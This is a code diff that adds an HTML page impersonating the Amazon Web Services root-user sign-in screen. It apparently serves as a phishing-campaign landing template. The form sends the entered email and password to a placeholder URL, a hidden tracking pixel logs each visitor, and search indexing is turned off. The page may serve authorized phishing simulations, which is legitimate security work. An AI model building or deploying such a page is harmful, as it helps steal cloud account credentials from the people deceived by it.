@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Amazon Web Services Sign-In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Amazon Ember', Arial, sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; background: #232f3e; padding: 12px 24px; display: flex; align-items: center; }
+        .header-logo { color: #ff9900; font-size: 22px; font-weight: 700; letter-spacing: -0.5px; }
+        .header-logo span { color: #fff; font-weight: 400; font-size: 14px; margin-left: 8px; }
+        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
+        .login-card { width: 420px; background: #fff; border: 1px solid #ddd; border-radius: 4px; padding: 32px; }
+        h1 { font-size: 28px; font-weight: 400; color: #232f3e; margin-bottom: 24px; }
+        .tab-bar { display: flex; border-bottom: 1px solid #ddd; margin-bottom: 24px; }
+        .tab { padding: 10px 20px; font-size: 14px; color: #545b64; cursor: pointer; border-bottom: 2px solid transparent; }
+        .tab.active { color: #232f3e; border-bottom-color: #ff9900; font-weight: 600; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 14px; font-weight: 700; color: #232f3e; margin-bottom: 4px; }
+        .form-group input { width: 100%; padding: 8px 10px; border: 1px solid #aab7b8; border-radius: 3px; font-size: 14px; outline: none; }
+        .form-group input:focus { border-color: #ff9900; box-shadow: 0 0 0 3px rgba(255,153,0,0.25); }
+        .submit-btn { width: 100%; background: #ff9900; color: #111; border: 1px solid #a88734; border-radius: 3px; padding: 8px 16px; font-size: 14px; cursor: pointer; margin-top: 8px; }
+        .submit-btn:hover { background: #e88b00; }
+        .help-text { font-size: 12px; color: #545b64; margin-top: 16px; }
+        .help-text a { color: #0073bb; text-decoration: none; }
+        .help-text a:hover { text-decoration: underline; }
+        .divider { border-top: 1px solid #e7e7e7; margin: 20px 0; position: relative; text-align: center; }
+        .divider span { background: #fff; padding: 0 10px; font-size: 12px; color: #767676; position: relative; top: -9px; }
+        .create-btn { width: 100%; background: #e7e9eb; color: #111; border: 1px solid #adb1b8; border-radius: 3px; padding: 8px 16px; font-size: 14px; cursor: pointer; text-align: center; display: block; text-decoration: none; }
+        .footer { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #545b64; }
+        .footer a { color: #0073bb; text-decoration: none; margin: 0 8px; }
+        @media (max-width: 480px) { .login-card { width: 100%; border: none; } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-logo">aws <span>Amazon Web Services</span></div>
+    </div>
+    <div class="main">
+        <div class="login-card">
+            <h1>Sign in</h1>
+            <div class="tab-bar">
+                <div class="tab active">Root user</div>
+                <div class="tab">IAM user</div>
+            </div>
+            <form action="{{.URL}}" method="POST">
+                <div class="form-group">
+                    <label for="email">Root user email address</label>
+                    <input type="email" id="email" name="email" placeholder="Email address" required autofocus>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="submit-btn">Sign in</button>
+            </form>
+            <div class="help-text">
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="divider"><span>New to AWS?</span></div>
+            <a href="#" class="create-btn">Create a new AWS account</a>
+        </div>
+    </div>
+    <div class="footer">
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <span>&copy; 2024, Amazon Web Services, Inc.</span>
+    </div>
+    <img src="{{.Tracker}}" style="display:none" alt="">
+</body>
+</html>
